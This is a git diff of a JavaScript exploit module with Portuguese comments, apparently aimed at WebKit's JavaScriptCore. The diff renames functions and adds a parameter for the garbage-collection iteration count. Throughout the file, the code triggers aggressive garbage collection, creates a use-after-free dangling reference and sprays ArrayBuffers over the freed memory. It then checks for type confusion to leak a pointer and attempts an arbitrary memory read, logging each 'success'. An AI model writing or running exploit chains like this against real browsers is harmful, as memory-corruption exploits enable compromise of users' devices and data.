@@ -1,28 +1,27 @@
 // js/test.bundle.mjs
 
-// --- Importações de outros pacotes ---
-import { logToDiv, PAUSE, AdvancedInt64, toHex, isAdvancedInt64Object, getElementById } from './utils.bundle.mjs';
+// --- Importações de outros pacotes (com nomes atualizados) ---
+import { log as log, PAUSE, Int64, toHex, isInt64, getElement } from './utils.bundle.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from './config.mjs';
 
-// --- Início de s3_utils.mjs ---
-export const SHORT_PAUSE_S3 = 50;
-export const MEDIUM_PAUSE_S3 = 500;
+// --- Início de s3_utils.mjs (Simplificado) ---
+export const SHORT_PAUSE = 50;
+export const MEDIUM_PAUSE = 500;
 
-export const logS3 = (message, type = 'info', funcName = '') => {
-    // Usa logToDiv do utils.bundle
-    logToDiv('output-advanced', message, type, funcName);
+// Renomeado de logS3 para logTest
+export const logTest = (message, type = 'info', funcName = '') => {
+    log('output-advanced', message, type, funcName); // Usa a função 'log' base
 };
 
-// Usa PAUSE do utils.bundle
-export const PAUSE_S3 = (ms = SHORT_PAUSE_S3) => PAUSE(ms);
+// Renomeado de PAUSE_S3 para pauseTest
+export const pauseTest = (ms = SHORT_PAUSE) => PAUSE(ms);
 
 
-// --- Início de testArrayBufferVictimCrash.mjs ---
-// Note que as importações de s3_utils e utils já foram resolvidas acima
-// A importação de core_exploit.mjs foi removida por não ser essencial
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R54_Hyper_GC";
+// --- Início de testArrayBufferVictimCrash.mjs (Renomeado) ---
+export const FNAME_MODULE_UAF = "UAF_Test_R54_Hyper_GC";
 
-function int64ToDouble(int64) {
+// Renomeado de int64ToDouble para int64ToFloat
+function int64ToFloat(int64) {
     const buf = new ArrayBuffer(8);
     const u32 = new Uint32Array(buf);
     const f64 = new Float64Array(buf);
@@ -31,29 +30,31 @@ function int64ToDouble(int64) {
     return f64[0];
 }
 
-export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Hyper GC & Type Variation (R54) ---`, "test");
+// Renomeado de executeTypedArrayVictimAddrofAndWebKitLeak_R43 para runUAFTest
+// *** AGORA ACEITA O NÚMERO DE ITERAÇÕES ***
+export async function runUAFTest(gcIterations) {
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_UAF;
+    logTest(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: (R54) com ${gcIterations} iterações ---`, "test");
     
     let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
     let dangling_ref = null;
     let spray_buffers = [];
 
     try {
-        logS3("--- FASE 1: Limpeza Agressiva Inicial do Heap ---", "subtest");
-        await triggerGC_Hyper();
+        logTest("--- FASE 1: Limpeza Agressiva Inicial do Heap ---", "subtest");
+        await triggerAggressiveGC(gcIterations); // Passa o valor
 
-        logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
-        dangling_ref = sprayAndCreateDanglingPointer();
-        logS3("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
+        logTest("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
+        dangling_ref = createDanglingPointer(); // Renomeado
+        logTest("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
         
-        logS3("--- FASE 3: Múltiplas tentativas de forçar a Coleta de Lixo ---", "subtest");
-        await triggerGC_Hyper();
-        await PAUSE_S3(100);
-        await triggerGC_Hyper();
-        logS3("    Memória do objeto-alvo deve ter sido liberada.", "warn");
+        logTest("--- FASE 3: Múltiplas chamadas de GC para garantir a liberação ---", "subtest");
+        await triggerAggressiveGC(gcIterations); // Passa o valor
+        await pauseTest(100); 
+        await triggerAggressiveGC(gcIterations); // Passa o valor
+        logTest("    Memória do objeto-alvo deve ter sido liberada.", "warn");
 
-        logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
+        logTest("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
         for (let i = 0; i < 1024; i++) {
             const buf = new ArrayBuffer(136); 
             const view = new BigUint64Array(buf);
@@ -61,29 +62,29 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             view[1] = 0x4242424242424242n;
             spray_buffers.push(buf);
         }
-        logS3(`    Pulverização de ${spray_buffers.length} buffers concluída. Verificando...`, "info");
+        logTest(`    Pulverização de ${spray_buffers.length} buffers concluída. Verificando...`, "info");
 
-        logS3(`DEBUG: typeof dangling_ref.corrupted_prop é: ${typeof dangling_ref.corrupted_prop}`, "info");
+        logTest(`DEBUG: typeof dangling_ref.corrupted_prop é: ${typeof dangling_ref.corrupted_prop}`, "info");
 
         if (typeof dangling_ref.corrupted_prop !== 'number') {
             throw new Error(`Falha no UAF. Tipo era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
         }
         
-        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
+        logTest("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
 
         const leaked_ptr_double = dangling_ref.corrupted_prop;
         const buf_conv = new ArrayBuffer(8);
         (new Float64Array(buf_conv))[0] = leaked_ptr_double;
         const int_view = new Uint32Array(buf_conv);
-        const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
-        logS3(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
+        const leaked_addr = new Int64(int_view[0], int_view[1]); // Renomeado
+        logTest(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
         
-        logS3("--- FASE 6: Armar a confusão de tipos para Leitura/Escrita Arbitrária ---", "subtest");
+        logTest("--- FASE 6: Armar a confusão de tipos para Leitura/Escrita Arbitrária ---", "subtest");
         let corrupted_buffer = null;
         for (const buf of spray_buffers) {
             const view = new BigUint64Array(buf);
             if (view[0] !== 0x4141414141414141n) {
-                logS3("Encontrado o ArrayBuffer corrompido!", "good");
+                logTest("Encontrado o ArrayBuffer corrompido!", "good");
                 corrupted_buffer = buf;
                 break;
             }
@@ -93,14 +94,14 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             throw new Error("Não foi possível encontrar o buffer corrompido.");
         }
 
-        const target_address_to_read = new AdvancedInt64("0x00000000", "0x08000000"); 
-        dangling_ref.prop_b = int64ToDouble(target_address_to_read);
+        const target_address_to_read = new Int64("0x00000000", "0x08000000"); // Renomeado
+        dangling_ref.prop_b = int64ToFloat(target_address_to_read); // Renomeado
 
         const hacked_view = new DataView(corrupted_buffer);
         const read_value = hacked_view.getUint32(0, true); 
 
-        logS3(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
-        logS3(`Lido do endereço ${target_address_to_read.toString(true)}: 0x${toHex(read_value)}`, "leak");
+        logTest(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
+        logTest(`Lido do endereço ${target_address_to_read.toString(true)}: 0x${toHex(read_value)}`, "leak");
 
         final_result = { 
             success: true, 
@@ -111,33 +112,33 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
     } catch (e) {
         final_result.message = `Exceção na cadeia UAF: ${e.message}`;
-        logS3(final_result.message, "critical");
+        logTest(final_result.message, "critical");
     }
 
-    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
-    return {
-        errorOccurred: final_result.success ? null : final_result.message,
-        addrof_result: final_result,
-        webkit_leak_result: { success: final_result.success, msg: final_result.message },
-        heisenbug_on_M2_in_best_result: final_result.success
-    };
+    logTest(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
+    // Retorna um objeto simplificado para o orquestrador
+    return final_result; 
 }
 
-async function triggerGC_Hyper() {
-    logS3("    Acionando GC Agressivo (Hyper)...", "info");
+// Renomeado de triggerGC_Hyper para triggerAggressiveGC
+// *** AGORA ACEITA O NÚMERO DE ITERAÇÕES ***
+async function triggerAggressiveGC(iterations) {
+    logTest(`    Acionando GC Agressivo com ${iterations} iterações...`, "info");
     try {
         const gc_trigger_arr = [];
-        for (let i = 0; i < 1000; i++) {
+        // O loop agora usa o valor do input, não mais 1000 fixo
+        for (let i = 0; i < iterations; i++) {
             gc_trigger_arr.push(new ArrayBuffer(1024 * i)); 
             gc_trigger_arr.push(new Array(1024 * i).fill(0));
         }
     } catch (e) {
-        logS3("    Memória esgotada durante o GC Hyper (esperado).", "info");
+        logTest(`    Memória esgotada durante o GC (esperado).`, "info");
     }
-    await PAUSE_S3(500);
+    await pauseTest(500); // Renomeado
 }
 
-function sprayAndCreateDanglingPointer() {
+// Renomeado de sprayAndCreateDanglingPointer para createDanglingPointer
+function createDanglingPointer() {
     let dangling_ref_internal = null;
     function createScope() {
         const victim = {
@@ -156,77 +157,69 @@ function sprayAndCreateDanglingPointer() {
 }
 
 
-// --- Início de runAllAdvancedTestsS3.mjs ---
-async function testJITBehavior() {
-    logS3("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
+// --- Início de runAllAdvancedTestsS3.mjs (Renomeado) ---
+
+// Renomeado de testJITBehavior para checkJIT
+async function checkJIT() {
+    logTest("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'checkJIT');
     let test_buf = new ArrayBuffer(16);
     let float_view = new Float64Array(test_buf);
     let uint32_view = new Uint32Array(test_buf);
     let some_obj = { a: 1, b: 2 };
 
-    logS3("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
+    logTest("Escrevendo um objeto em um Float64Array...", 'info', 'checkJIT');
     float_view[0] = some_obj;
 
     const low = uint32_view[0];
     const high = uint32_view[1];
-    const leaked_val = new AdvancedInt64(low, high);
+    const leaked_val = new Int64(low, high); // Renomeado
     
-    logS3(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior');
+    logTest(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor: ${leaked_val.toString(true)})`, 'leak', 'checkJIT');
 
     if (high === 0x7ff80000 && low === 0) {
-        logS3("CONFIRMADO: O JIT converteu o objeto para NaN.", 'good', 'testJITBehavior');
+        logTest("CONFIRMADO: O JIT converteu o objeto para NaN.", 'good', 'checkJIT');
     } else {
-        logS3("INESPERADO: O JIT não converteu para NaN.", 'warn', 'testJITBehavior');
+        logTest("INESPERADO: O JIT não converteu para NaN.", 'warn', 'checkJIT');
     }
-    logS3("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
+    logTest("--- Teste de Comportamento do JIT Concluído ---", 'test', 'checkJIT');
 }
 
-async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
-    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43"; 
-    logS3(`==== INICIANDO Estratégia de Reprodução (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
+// Renomeado de runHeisenbugReproStrategy_TypedArrayVictim_R43 para runUAFStrategy
+async function runUAFStrategy(gcIterations) {
+    const FNAME_RUNNER = "runUAFStrategy"; 
+    logTest(`==== INICIANDO Estratégia de UAF (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
     
-    // Usa a função execute... definida acima
-    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43(); 
+    // Passa o gcIterations para a função de teste principal
+    const result = await runUAFTest(gcIterations); 
+    const module_name_for_title = FNAME_MODULE_UAF;
 
-    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-
-    if (result.errorOccurred) {
-        logS3(`  RUNNER: Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
-        document.title = `${module_name_for_title}: MainTest ERR!`;
-    } else if (result) {
-        const webkitLeakResult = result.webkit_leak_result;
-        if (webkitLeakResult?.success) {
-            logS3(`  RUNNER: Teste WebKit Base Leak: ${webkitLeakResult.msg}`, "vuln", FNAME_RUNNER);
-            document.title = `${module_name_for_title}_R43L: WebKitLeak SUCCESS!`;
-        } else {
-            logS3(`  RUNNER: Teste WebKit Base Leak falhou: ${webkitLeakResult?.msg || 'N/A'}`, "warn", FNAME_RUNNER);
-            document.title = `${module_name_for_title}_R43L: WebKitLeak Fail`;
-        }
+    if (result.success) {
+        logTest(`  RUNNER: Teste UAF: ${result.message}`, "vuln", FNAME_RUNNER);
+        document.title = `${module_name_for_title}: SUCCESS!`;
     } else {
-        document.title = `${module_name_for_title}_R43L: Invalid Result Obj`;
+        logTest(`  RUNNER: Teste UAF ERRO: ${String(result.message)}`, "critical", FNAME_RUNNER);
+        document.title = `${module_name_for_title}: MainTest ERR!`;
     }
-    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
-    logS3(`==== Estratégia de Reprodução (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
+    
+    logTest(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
+    await pauseTest(MEDIUM_PAUSE); // Renomeado
+    logTest(`==== Estratégia de UAF (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
 }
 
 // Esta é a função principal exportada que o index.html chama
-export async function runAllAdvancedTestsS3() {
-    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator`;
-    logS3(`==== INICIANDO Script 3 R43L (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
+// Renomeado de runAllAdvancedTestsS3 para runAllTests
+export async function runAllTests(gcIterations) {
+    const FNAME_ORCHESTRATOR = `UAF_MainOrchestrator`;
+    logTest(`==== INICIANDO Script Principal (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
     
-    await testJITBehavior(); 
-    await PAUSE_S3(500); 
+    await checkJIT(); // Renomeado
+    await pauseTest(500); // Renomeado
     
-    await runHeisenbugReproStrategy_TypedArrayVictim_R43();
+    // Passa o gcIterations para a estratégia
+    await runUAFStrategy(gcIterations); 
     
-    logS3(`\n==== Script 3 R43L (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
+    logTest(`\n==== Script Principal (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
     
-    // Tenta reabilitar o botão principal (definido no index.html)
-    const runBtn = getElementById('runIsolatedTestBtn'); 
+    const runBtn = getElement('runIsolatedTestBtn'); 
     if (runBtn) runBtn.disabled = false;
-
-    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail")) {
-        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43L Done`;
-    }
 }
